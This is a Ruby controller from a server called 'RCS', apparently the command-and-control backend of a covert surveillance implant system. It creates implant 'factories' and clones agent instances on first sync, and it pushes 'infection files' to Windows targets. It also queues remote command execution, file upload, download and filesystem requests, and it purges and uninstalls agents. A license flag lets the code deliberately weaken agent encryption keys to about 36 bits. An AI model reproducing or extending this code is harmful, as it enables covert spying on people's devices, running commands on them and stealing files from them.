#
# Controller for the Agent objects
#

require_relative '../license'
require_relative '../alert'

require 'rcs-common/crypt'

module RCS
module DB

class AgentController < RESTController
  include RCS::Crypt

  def index
    require_auth_level :tech, :view

    mongoid_query do
      fields = ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled",
                "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device",
                "stat.source", "stat.size", "stat.grid_size"]

      fields = fields.inject({}) { |h, f| h[f] = 1; h }
      selector = {'deleted' => {'$in' => [false, nil]}, 'user_ids' => @session.user[:_id], '_kind' => {'$in' => ['agent', 'factory']}}
      agents = Item.collection.find(selector).select(fields)

      ok(agents)
    end
  end
  
  def show
    require_auth_level :tech, :view

    mongoid_query do
      ag = ::Item.where(_id: @params['_id'], deleted: false).in(user_ids: [@session.user[:_id]]).only("name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "good", "version", "counter", "configs")
      agent = ag.first
      return not_found if agent.nil?
      ok(agent)
    end
  end
  
  def update
    require_auth_level :tech
    
    updatable_fields = ['name', 'desc', 'status']
    
    mongoid_query do
      item = Item.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      
      @params.delete_if {|k, v| not updatable_fields.include? k }
      
      @params.each_pair do |key, value|
        if item[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session.user[:name],
                    :action => "#{item._kind}.update",
                    (item._kind + '_name').to_sym => item['name'],
                    :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
        end
      end
      
      item.update_attributes(@params)
      
      return ok(item)
    end
  end
  
  def destroy
    require_auth_level :tech

    mongoid_query do
      item = Item.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])

      Audit.log :actor => @session.user[:name],
                :action => "#{item._kind}.delete",
                (item._kind + '_name').to_sym => @params['name'],
                :desc => "Deleted #{item._kind} '#{item['name']}'"

      # if the deletion is permanent, destroy the item
      if @params['permanent']
        trace :info, "Agent #{item.name} permanently deleted"

        # mark as deleted to report to the console immediately
        item.deleted = true
        item.save

        task = {name: "delete evidence for #{item.name}",
                method: "::Item.offload_destroy",
                params: {id: item[:_id]}}

        OffloadManager.instance.run task

        return ok
      end

      # don't actually destroy the agent, but mark it as deleted
      item.deleted = true
      item.save

      # run the destroy callback to clean the evidence collection
      task = {name: "delete evidence for #{item.name}",
              method: "::Item.offload_destroy_callback",
              params: {id: item[:_id]}}

      OffloadManager.instance.run task

      return ok
    end
  end
  
  def create
    require_auth_level :tech
    require_auth_level :tech_factories

    # need a path to put the factory
    return bad_request('INVALID_OPERATION') unless @params.has_key? 'operation'

    mongoid_query do

      operation = ::Item.operations.find(@params['operation'])
      return bad_request('INVALID_OPERATION') if operation.nil?

      if @params['target'].nil?
        target = nil
      else
        target = ::Item.targets.find(@params['target'])
        return bad_request('INVALID_TARGET') if target.nil?
      end

      # used to generate log/conf keys and seed
      alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-'

      item = Item.create!(desc: @params['desc']) do |doc|
        doc[:_kind] = :factory
        doc[:path] = [operation._id]
        doc[:path] << target._id unless target.nil?
        doc.users = operation.users
        doc[:status] = :open
        doc[:type] = @params['type']
        doc[:ident] = get_new_ident
        doc[:name] = @params['name']
        doc[:name] ||= doc[:ident]
        doc[:type] = @params['type']
        doc[:counter] = 0
        seed = (0..11).inject('') {|x,y| x += alphabet[rand(0..alphabet.size-1)]}
        seed.setbyte(8, 46)
        doc[:seed] = seed
        doc[:confkey] = calculate_random_key
        doc[:logkey] = calculate_random_key
        doc[:configs] = []
      end

      Audit.log :actor => @session.user[:name],
                :action => "factory.create",
                :operation_name => operation['name'],
                :target_name => target ? target['name'] : '',
                :agent_name => item['name'],
                :desc => "Created factory '#{item['name']}'"

      item = Item.factories
        .only(:name, :desc, :status, :_kind, :path, :ident, :type, :counter, :configs, :good)
        .find(item._id)

      ok(item)
    end
  end

  def calculate_random_key
    # pur alphabet is 64 combination
    alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-'

    # NOTE about the key space:
    # the length of the key is 32 chars based on an alphabet of 64 combination
    # so the combinations are 64^32 that is 2^192 bits

    key = (0..31).inject('') {|x,y| x += alphabet[rand(0..alphabet.size-1)]}

    # reduce the key space if needed
    # if the license contains the flag to lower the encryption bits we have to
    # cap this to 2^40 so we can cut the key to 6 chars that is 64^6 == 2^36 bits

    key[6..-1] = "-" * (key.length - 6) if LicenseManager.instance.limits[:encbits]

    return key
  end

  def get_new_ident
    global = ::Item.where({_kind: 'global'}).first
    global = ::Item.new({_kind: 'global', counter: 0}) if global.nil?
    global.inc(:counter, 1)
    global.save
    "RCS_#{global.counter.to_s.rjust(10, "0")}"
  end

  def add_config
    require_auth_level :tech
    require_auth_level :tech_config

    mongoid_query do
      agent = Item.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])

      @params['desc'] ||= ''
      
      case agent._kind
        when 'agent'
          # the config was not sent, replace it
          if agent.configs.last.sent.nil? or agent.configs.last.sent == 0
            @params.delete('_id')
            agent.configs.last.update_attributes(@params)
            config = agent.configs.last
          else
            config = agent.configs.create!(config: @params['config'], desc: @params['desc'])
          end
          
          config.saved = Time.now.getutc.to_i
          config.user = @session.user[:name]
          config.save

        when 'factory'
          agent.configs.delete_all
          config = agent.configs.create!(desc: agent.desc, config: @params['config'], user: @session.user[:name], saved: Time.now.getutc.to_i)
      end
      
      Audit.log :actor => @session.user[:name],
                :action => "#{agent._kind}.config",
                (agent._kind + '_name').to_sym => @params['name'],
                :desc => "Saved configuration for agent '#{agent['name']}'"
      
      return ok(config)
    end
  end

  def update_config
    require_auth_level :tech
    require_auth_level :tech_config

    mongoid_query do
      agent = Item.any_in(user_ids: [@session.user[:_id]]).where(_kind: 'agent').find(@params['_id'])
      config = agent.configs.where({:_id => @params['config_id']}).first

      config[:desc] = @params['desc']
      config.save

      return ok
    end
  end

  def del_config
    require_auth_level :tech
    require_auth_level :tech_config

    mongoid_query do
      agent = Item.any_in(user_ids: [@session.user[:_id]]).where(_kind: 'agent').find(@params['_id'])
      agent.configs.find(@params['config_id']).destroy

      Audit.log :actor => @session.user[:name],
                :action => "#{agent._kind}.del_config",
                (agent._kind + '_name').to_sym => @params['name'],
                :desc => "Deleted configuration for agent '#{agent['name']}'"
      
      return ok
    end
  end
  
  # retrieve the factory key of the agents
  # if the parameter is specified, it take only that class
  # otherwise, return all the keys for all the classes
  def factory_keys
    require_auth_level :server
    
    classes = {}
    
    # request for a specific instance
    if @params['_id']
      Item.where({_kind: 'factory', ident: @params['_id']}).each do |entry|
        classes[entry[:ident]] = {key: entry[:confkey], good: entry[:good]}
      end
    # all of them
    else
      Item.where({_kind: 'factory'}).each do |entry|
        classes[entry[:ident]] = {key: entry[:confkey], good: entry[:good]}
      end
    end
    
    return ok(classes)
  end
  
  # retrieve the status of a agent instance.
  def status
    require_auth_level :server, :tech
    
    demo = (@params['demo'] == 'true') ? true : false
    scout = (@params['scout'] == 'true') ? true : false
    platform = @params['platform'].downcase

    # retro compatibility for older agents (pre 8.0) sending win32, win64, ios, osx
    case platform
      when 'win32', 'win64'
        platform = 'windows'
      when 'winmobile'
        platform = 'winmo'
      when 'iphone'
        platform = 'ios'
      when 'macos'
        platform = 'osx'
    end

    # is the agent already in the database? (has it synchronized at least one time?)
    agent = Item.where({_kind: 'agent', ident: @params['ident'], instance: @params['instance'].downcase, platform: platform, demo: demo}).first

    # yes it is, return the status
    unless agent.nil?
      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, scout: #{scout}, good: #{agent[:good]})"

      # if the agent was queued, but now we have a license, use it and set the status to open
      # a demo agent will never be queued
      if agent[:status] == 'queued' and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym)
        agent.status = 'open'
        agent.save
      end

      # the agent was a scout but now is upgraded to elite
      if agent.scout and not scout
        # add the upload files for the first sync
        agent.add_first_time_uploads

        # add the files needed for the infection module
        agent.add_infection_files if agent.platform == 'windows'
      end

      # update the scout flag
      if agent.scout != scout
        agent.scout = scout
        agent.save
      end

      status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id], :good => agent[:good]}
      return ok(status)
    end

    factory = nil

    synchronize do
      # search for the factory of that instance
      factory = Item.where({_kind: 'factory', ident: @params['ident'], status: 'open'}).first

      if factory && factory.good
        # increment the instance counter for the factory
        factory[:counter] += 1
        factory.save
      end
    end

    # the status of the factory must be open otherwise no instance can be cloned from it
    return not_found("Factory not found: #{@params['ident']}") if factory.nil?

    # the status of the factory must be open otherwise no instance can be cloned from it
    return not_found("Factory is marked as compromised found: #{@params['ident']}") unless factory.good


    trace :info, "Creating new instance for #{factory[:ident]} (#{factory[:counter]})"

    # clone the new instance from the factory
    agent = factory.clone_instance

    # check where the factory is:
    # if inside a target, just create the instance
    # if inside an operation, we have to create a target for each instance
    parent = Item.find(factory.path.last)

    if parent[:_kind] == 'target'
      agent.path = factory.path
    elsif parent[:_kind] == 'operation'
      target = Item.create(name: agent.name) do |doc|
        doc[:_kind] = :target
        doc[:path] = factory.path
        doc.users = parent.users
        doc.stat = ::Stat.new
        doc[:status] = :open
        doc[:desc] = "Created automatically on first sync from: #{agent.name}"
      end

      agent.path = factory.path << target._id
    end

    # specialize it with the platform and the unique instance
    agent.platform = platform
    agent.instance = @params['instance'].downcase
    agent.demo = demo
    agent.scout = scout

    # default is queued
    agent.status = 'queued'

    # demo agent don't consume any license
    agent.status = 'open' if demo
    
    # check the license to see if we have room for another agent
    if demo == false and LicenseManager.instance.burn_one_license(agent.type.to_sym, agent.platform.to_sym)
      agent.status = 'open'
    end

    # save the new instance in the db
    agent.save

    # the scout must not receive the first uploads
    unless scout
      # add the upload files for the first sync
      agent.add_first_time_uploads

      # add the files needed for the infection module
      agent.add_infection_files if agent.platform == 'windows'
    end

    # check for alerts on this new instance
    Alerting.new_instance agent

    # notify the injectors of the infection
    ::Injector.all.each {|p| p.disable_on_sync(factory)}

    status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id], :good => agent[:good]}
    return ok(status)
  end

  def uninstall
    require_auth_level :server

    mongoid_query do
      agent = Item.find(@params['_id'])

      Audit.log :actor => '<system>',
                    :action => "agent.uninstall",
                    :agent_name => agent['name'],
                    :desc => "Has sent the uninstall command to '#{agent['name']}'"

      agent.uninstalled = true
      agent.save

      return ok(agent)
    end
  end

  # this methods is an helper to reduce the number of requests the collector
  # has to perform during the ident phase
  def availables
    require_auth_level :server

    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    return not_found("Agent not found: #{@params['_id']}") if agent.nil?

    availables = []

    # config
    conf = agent.configs.last
    availables << :config if conf and conf.activated.nil?
    # purge
    availables << :purge if agent.purge and agent.purge != [0,0]
    # uploads
    availables << :upload if agent.upload_requests.where({sent: 0}).count > 0
    # upgrade
    availables << :upgrade if agent.upgrade_requests.count > 0
    # exec
    availables << :exec if agent.exec_requests.count > 0
    # downloads
    availables << :download if agent.download_requests.count > 0
    # filesystem
    availables << :filesystem if agent.filesystem_requests.count > 0

    trace :info, "[#{@request[:peer]}] Availables for #{agent.name} are: #{availables.inspect}" if availables.size > 0

    return ok(availables)
  end

  def config
    require_auth_level :server, :tech
    
    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
    return not_found("Agent not found: #{@params['_id']}") if agent.nil?

    # don't send the config to agent too old
    if agent.platform == 'blackberry' or agent.platform == 'android'
      if agent.version < 2012013101
        trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
        return not_found
      end
    else
      if agent.version < 2012041601
        trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
        return not_found
      end
    end

    case @request[:method]
      when 'GET'
        config = agent.configs.last
        return not_found if config.nil? or config.activated

        # we have sent the configuration, wait for activation
        config.sent = Time.now.getutc.to_i
        config.save

        # add the files needed for the infection module
        agent.add_infection_files if agent.platform == 'windows'

        # encrypt the config for the agent using the confkey
        enc_config = config.encrypted_config(agent[:confkey])
        
        return ok(enc_config, {content_type: 'binary/octet-stream'})
        
      when 'DELETE'
        config = agent.configs.last
        # consistency check (don't allow a config which is activated but never sent)
        config.sent = Time.now.getutc.to_i if config.sent.nil? or config.sent == 0
        config.activated = Time.now.getutc.to_i
        config.save

        trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
    end
    
    return ok
  end


  # retrieve the list of upload for a given agent
  def uploads
    require_auth_level :server, :tech

    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

    if server?
      list = agent.upload_requests.where({sent: 0})
    else
      list = agent.upload_requests
    end

    return ok(list)
  end

  # retrieve or delete a single upload entity
  def upload
    require_auth_level :server, :tech

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

      case @request[:method]
        when 'GET'
          upl = agent.upload_requests.where({ _id: @params['upload']}).first
          content = GridFS.get upl[:_grid]
          trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
          return ok(content.read, {content_type: content.content_type})
        when 'POST'
          require_auth_level :tech_upload

          return conflict('NO_UPLOAD') unless LicenseManager.instance.check :modify

          upl = @params['upload']
          file = @params['upload'].delete 'file'
          upl['_grid'] = GridFS.put(File.open(Config.instance.temp(file), 'rb+') {|f| f.read}, {filename: upl['filename']})
          upl['_grid_size'] = File.size Config.instance.temp(file)
          File.delete Config.instance.temp(file)
          agent.upload_requests.create(upl)
          Audit.log :actor => @session.user[:name], :action => "agent.upload", :desc => "Added an upload request for agent '#{agent['name']}'"
        when 'DELETE'
          agent.upload_requests.where({ _id: @params['upload']}).update({sent: Time.now.to_i})
          trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
      end

      return ok
    end
  end

  # fucking flex that does not support the DELETE http method
  def upload_destroy
    require_auth_level :tech
    require_auth_level :tech_upload

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
      agent.upload_requests.find(@params['upload']).destroy
      Audit.log :actor => @session.user[:name], :action => "agent.upload", :desc => "Removed an upload request for agent '#{agent['name']}'"
      return ok
    end
  end

  # retrieve the list of upgrade for a given agent
  def upgrades
    require_auth_level :server, :tech
    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
      list = agent.upgrade_requests

      return ok(list)
    end
  end
  
  # retrieve or delete a single upgrade entity
  def upgrade
    require_auth_level :server, :tech

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

      case @request[:method]
        when 'GET'
          upl = agent.upgrade_requests.where({ _id: @params['upgrade']}).first
          content = GridFS.get upl[:_grid]
          trace :debug, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
          return ok(content.read, {content_type: content.content_type})
        when 'POST'
          require_auth_level :tech_build

          Audit.log :actor => @session.user[:name], :action => "agent.upgrade", :desc => "Requested an upgrade for agent '#{agent['name']}'"
          trace :info, "Agent #{agent.name} request for upgrade"
          agent.upgrade!
          trace :info, "Agent #{agent.name} scheduled for upgrade"
        when 'DELETE'
          agent.upgrade_requests.destroy_all
          agent.upgradable = false
          agent.save
          trace :info, "Agent #{agent.name} upgraded"
      end

      return ok
    end
  end

  def blacklist
    require_auth_level :tech
    ok(File.read(RCS::DB::Config.instance.file('blacklist')))
  end

  # retrieve the list of download for a given agent
  def downloads
    require_auth_level :server, :tech

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
      list = agent.download_requests

      return ok(list)
    end
  end

  def download
    require_auth_level :server, :tech, :view

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

      case @request[:method]
        when 'POST'
          agent.download_requests.create(@params['download'])
          trace :info, "[#{@request[:peer]}] Added download request #{@params['download']}"
          Audit.log :actor => @session.user[:name], :action => "agent.download", :desc => "Added a download request for agent '#{agent['name']}'"
        when 'DELETE'
          agent.download_requests.find(@params['download']).destroy
          trace :info, "[#{@request[:peer]}] Deleted the DOWNLOAD #{@params['download']}"
      end

      return ok
    end
  end

  # fucking flex that does not support the DELETE http method
  def download_destroy
    require_auth_level :tech

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
      agent.download_requests.find(@params['download']).destroy
      Audit.log :actor => @session.user[:name], :action => "agent.download", :desc => "Removed a download request for agent '#{agent['name']}'"
      return ok
    end
  end

  # retrieve the list of filesystem for a given agent
  def filesystems
    require_auth_level :server, :view

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
      list = agent.filesystem_requests

      return ok(list)
    end
  end
  
  def filesystem
    require_auth_level :server, :view

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

      return not_found() if agent.nil?

      case @request[:method]
        when 'POST'
          require_auth_level :view_filesystem

          begin
            if @params['filesystem']['path'] == 'default'
              agent.add_default_filesystem_requests
            else
              agent.filesystem_requests.create!(@params['filesystem'])
            end
          rescue Mongoid::Errors::Validations => error
            return bad_request('ALREADY_PENDING') if error.document.errors['path']
            raise error
          end

          trace :info, "[#{@request[:peer]}] Added filesystem request #{@params['filesystem']}"
          Audit.log :actor => @session.user[:name], :action => "agent.filesystem", :desc => "Added a filesystem request for agent '#{agent['name']}'"
        when 'DELETE'
          agent.filesystem_requests.find(@params['filesystem']).destroy
          trace :info, "[#{@request[:peer]}] Deleted the FILESYSTEM #{@params['filesystem']}"
      end

      return ok
    end
  end

  # fucking flex that does not support the DELETE http method
  def filesystem_destroy
    require_auth_level :view
    require_auth_level :view_filesystem

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
      agent.filesystem_requests.find(@params['filesystem']).destroy
      Audit.log :actor => @session.user[:name], :action => "agent.filesystem", :desc => "Removed a filesystem request for agent '#{agent['name']}'"
      return ok
    end
  end

  def purge
    require_auth_level :server, :tech, :view

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

      return not_found() if agent.nil?

      case @request[:method]
        when 'GET'
          purge = [0, 0]
          purge = agent.purge unless agent.purge.nil?
          return ok(purge)
        when 'POST'
          # purge local pending requests
          agent.upload_requests.destroy_all
          agent.filesystem_requests.destroy_all
          agent.download_requests.destroy_all
          agent.upgrade_requests.destroy_all
          agent.upgradable = false

          agent.purge = @params['purge']
          agent.save
          trace :info, "[#{@request[:peer]}] Added purge request #{@params['purge']}"
          Audit.log :actor => @session.user[:name], :action => "agent.purge", :desc => "Issued a purge request for agent '#{agent['name']}'"
        when 'DELETE'
          agent.purge = [0, 0]
          agent.save
          trace :info, "[#{@request[:peer]}] Purge command reset"
      end

      return ok
    end
  end

  def exec
    require_auth_level :server, :tech, :view

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first

      case @request[:method]
        when 'GET'
          list = agent.exec_requests
          return ok(list)
        when 'POST'
          require_auth_level :tech_exec

          return conflict('NO_EXEC') unless LicenseManager.instance.check :modify

          agent.exec_requests.create(@params['exec'])
          trace :info, "[#{@request[:peer]}] Added download request #{@params['exec']}"
          Audit.log :actor => @session.user[:name], :action => "agent.exec", :desc => "Added a command execution request for agent '#{agent['name']}'"
        when 'DELETE'
          agent.exec_requests.find(@params['exec']).destroy
          trace :info, "[#{@request[:peer]}] Deleted the EXEC #{@params['exec']}"
      end

      return ok
    end
  end

  # fucking flex that does not support the DELETE http method
  def exec_destroy
    require_auth_level :tech
    require_auth_level :tech_exec

    mongoid_query do
      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
      agent.exec_requests.find(@params['exec']).destroy
      Audit.log :actor => @session.user[:name], :action => "agent.exec", :desc => "Removed a command execution request for agent '#{agent['name']}'"
      return ok
    end
  end

  private

  def synchronize(&block)
    @@mutext ||= Mutex.new
    @@mutext.synchronize(&block)
  end
end

end #DB::
end #RCS::
